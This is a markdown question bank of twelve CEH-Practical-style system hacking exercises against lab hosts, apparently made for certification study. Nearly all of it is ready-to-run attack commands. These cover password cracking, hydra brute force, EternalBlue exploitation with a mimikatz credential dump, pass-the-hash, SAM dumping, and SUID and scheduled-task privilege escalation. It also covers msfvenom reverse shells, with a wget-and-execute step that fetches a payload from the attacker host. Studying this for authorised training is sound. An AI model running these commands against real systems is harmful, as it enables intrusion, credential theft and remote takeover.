# Question Bank — System Hacking (12 questions)

> Realistic CEH-Practical-style questions. Steps link into the relevant tool docs — click any flag to read what it does.

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

---

### Q1 🟢 — Identify the hash type of `5f4dcc3b5aa765d61d8327deb882cf99`

**Category:** Hash identification | **Tools:** [hashid](../../tools/hashid.md), [hashcat](../../tools/hashcat.md)

**Steps:**
1. `hashid '5f4dcc3b5aa765d61d8327deb882cf99'` ← [why hashid](../../tools/hashid.md#usage)
2. Cross-check the hashcat mode in [hashcat modes table](../../tools/hashcat.md#common-modes).

**Answer format:** hash name (e.g. `MD5`) + hashcat mode number (e.g. `0`)

**Gotcha:** hashid lists multiple candidates — pick the one matching context (Windows → NTLM mode 1000, Linux → sha512crypt mode 1800).

---

### Q2 🟢 — Crack an NTLM hash from 10.10.10.5 with hashcat

**Category:** Hash cracking | **Tools:** [hashcat](../../tools/hashcat.md)

**Steps:**
1. Save hash to `hash.txt` (one hash per line, no username).
2. `hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` ← [why -m 1000](../../tools/hashcat.md#common-modes)
3. When done: `hashcat -m 1000 hash.txt --show`

**Answer format:** cleartext password

**Gotcha:** if rockyou.txt is gzipped, run `gunzip /usr/share/wordlists/rockyou.txt.gz` first. `-a 0` = wordlist attack.

---

### Q3 🟢 — Crack a Linux shadow hash for user `bob` on 10.10.10.12 with john

**Category:** Hash cracking | **Tools:** [john](../../tools/john.md)

**Steps:**
1. Combine passwd + shadow: `unshadow passwd.txt shadow.txt > unshadowed.txt` ← [why unshadow](../../tools/john.md#unshadow)
2. `john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
3. `john --show unshadowed.txt`

**Answer format:** `bob:<password>`

**Gotcha:** john auto-detects `$6$` (sha512crypt). Force with `--format=sha512crypt` if it guesses wrong.

---

### Q4 🟡 — Brute force SSH login for user `admin` on 10.10.10.20

**Category:** Online brute force | **Tools:** [hydra](../../tools/hydra.md)

**Steps:**
1. Confirm SSH open: `nmap -p 22 10.10.10.20`
2. `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.20 -t 4` ← [why -t 4](../../tools/hydra.md#threading)
3. Wait for `[22][ssh] host: ... login: admin password: ...` line.

**Answer format:** cleartext password

**Gotcha:** SSH rate-limits — keep `-t 4` or lower. If connection resets, the server has fail2ban; try `-W 3` to slow down.

---

### Q5 🟡 — Brute force a web login form at `http://10.10.10.25/login.php`

**Category:** HTTP form brute | **Tools:** [hydra](../../tools/hydra.md), [burp](../../tools/burp.md)

**Steps:**
1. Capture the POST in [burp](../../tools/burp.md) to find field names and failure message.
2. Example failure: `Invalid credentials`.
3. `hydra -l admin -P rockyou.txt 10.10.10.25 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"` ← [why http-post-form](../../tools/hydra.md#http-form)

**Answer format:** cleartext password

**Gotcha:** the failure string must be unique — not a substring that appears on success. Use `F=` for fail or `S=` for success.

---

### Q6 🟡 — Exploit MS17-010 on 10.10.10.30 and retrieve the Administrator password

**Category:** Remote exploitation | **Tools:** [metasploit](../../tools/metasploit.md), [mimikatz](../../tools/mimikatz.md)

**Steps:**
1. `msfconsole -q`
2. `use exploit/windows/smb/ms17_010_eternalblue` ← [why eternalblue](../../tools/metasploit.md#eternalblue)
3. `set RHOSTS 10.10.10.30` ; `set LHOST tun0` ; `run`
4. On SYSTEM shell: `load kiwi` then `creds_all` (meterpreter mimikatz) ← [mimikatz creds](../../tools/mimikatz.md#creds_all)
5. Or `hashdump` for NTLM, then crack via Q2.

**Answer format:** plaintext password from `wdigest` or cracked NTLM

**Gotcha:** eternalblue crashes 32-bit targets — check arch with `sysinfo` first. Use `ms17_010_psexec` as fallback.

---

### Q7 🟡 — Pass-the-Hash into 10.10.10.35 as Administrator with NTLM `aad3b4...:31d6cfe...`

**Category:** Lateral movement | **Tools:** [crackmapexec](../../tools/crackmapexec.md), [impacket](../../tools/impacket.md)

**Steps:**
1. Spray the hash: `crackmapexec smb 10.10.10.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0` ← [why -H](../../tools/crackmapexec.md#pass-the-hash)
2. On `Pwn3d!`, shell in: `impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.10.10.35` ← [why psexec](../../tools/impacket.md#psexec)

**Answer format:** contents of `C:\Users\Administrator\Desktop\flag.txt` (or whatever asked)

**Gotcha:** PtH format is `LM:NT` — if you only have NT, prepend `aad3b435b51404eeaad3b435b51404ee:` or just use `-H <NT>`.

---

### Q8 🟡 — Dump the SAM database from 10.10.10.40 using valid credentials

**Category:** Credential dumping | **Tools:** [impacket](../../tools/impacket.md)

**Steps:**
1. `impacket-secretsdump Administrator:'P@ssw0rd'@10.10.10.40` ← [why secretsdump](../../tools/impacket.md#secretsdump)
2. Read the `[*] Dumping local SAM hashes` section.
3. Save NTLM hashes for cracking (see Q2).

**Answer format:** `user:RID:LM:NT:::` line for the asked user

**Gotcha:** needs admin. For DC dumping use `-just-dc` against a Domain Controller.

---

### Q9 🟢 — Get a shell on 10.10.10.45 via WinRM with creds `svc_web:Summer2024!`

**Category:** Remote shell | **Tools:** [evil-winrm](../../tools/evil-winrm.md)

**Steps:**
1. Confirm WinRM: `nmap -p 5985,5986 10.10.10.45`
2. `evil-winrm -i 10.10.10.45 -u svc_web -p 'Summer2024!'` ← [why evil-winrm](../../tools/evil-winrm.md#usage)
3. `whoami` then `type C:\Users\svc_web\Desktop\user.txt`

**Answer format:** flag contents

**Gotcha:** evil-winrm also takes `-H <NTLM>` for pass-the-hash. Escape `!` in bash with single quotes.

---

### Q10 🔴 — Linux privesc on 10.10.10.50: find and abuse a SUID binary

**Category:** Privilege escalation | **Tools:** `find`, [GTFOBins](https://gtfobins.github.io)

**Steps:**
1. `find / -perm -4000 -type f 2>/dev/null` ← lists SUID binaries
2. Compare output against [GTFOBins](https://gtfobins.github.io) — look for `find`, `vim`, `nmap`, `cp`, `env`, `python`, `tar`.
3. Example for `find`: `find . -exec /bin/sh -p \; -quit`
4. Confirm root: `id`

**Answer format:** `/root/root.txt` contents

**Gotcha:** some binaries need `-p` to preserve privileges. Also check capabilities: `getcap -r / 2>/dev/null`.

---

### Q11 🔴 — Windows privesc on 10.10.10.55 via an abusable scheduled task

**Category:** Privilege escalation | **Tools:** [metasploit](../../tools/metasploit.md), `schtasks`, `icacls`

**Steps:**
1. List tasks: `schtasks /query /fo LIST /v`
2. Find one running as SYSTEM that points to a writable script.
3. Check ACL: `icacls C:\scripts\backup.bat` — look for `(F)` for `Users` or `Everyone`.
4. Overwrite with payload from [msfvenom](../../tools/msfvenom.md):
   ```
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe > evil.exe
   ```
5. Replace backup.bat content with `C:\Temp\evil.exe`, start listener, wait for task to fire.

**Answer format:** SYSTEM flag (e.g. `C:\Users\Administrator\Desktop\root.txt`)

**Gotcha:** also check services (`sc qc <svc>`) for unquoted paths and weak perms. Run winPEAS if allowed.

---

### Q12 🔴 — Generate a Linux x64 reverse shell, catch it, and pop 10.10.10.60

**Category:** Payload generation | **Tools:** [msfvenom](../../tools/msfvenom.md), [metasploit](../../tools/metasploit.md)

**Steps:**
1. Generate ELF payload:
   ```
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf > sh.elf
   ```
   ← [why linux/x64/shell_reverse_tcp](../../tools/msfvenom.md#linux-payloads)
2. Host it: `python3 -m http.server 80`
3. Start handler:
   ```
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST tun0; set LPORT 4444; run"
   ```
4. On target: `wget http://tun0/sh.elf -O /tmp/sh.elf && chmod +x /tmp/sh.elf && /tmp/sh.elf`

**Answer format:** flag under `/home/<user>/user.txt`

**Gotcha:** payload arch must match target. For staged (`shell/reverse_tcp`) use the matching handler PAYLOAD exactly — mismatch = silent fail.

---

## 📌 Quick links

- [hashcat reference](../../tools/hashcat.md) · [john reference](../../tools/john.md) · [hashid](../../tools/hashid.md)
- [hydra reference](../../tools/hydra.md)
- [metasploit reference](../../tools/metasploit.md) · [msfvenom](../../tools/msfvenom.md)
- [crackmapexec](../../tools/crackmapexec.md) · [impacket](../../tools/impacket.md) · [evil-winrm](../../tools/evil-winrm.md) · [mimikatz](../../tools/mimikatz.md)
- [System hacking playbook](../../playbooks/system-hacking-playbook.md)
- [05-system-hacking README](../../05-system-hacking/README.md)
- [18-crypto (for cracking dumped hashes)](../../18-crypto/README.md)
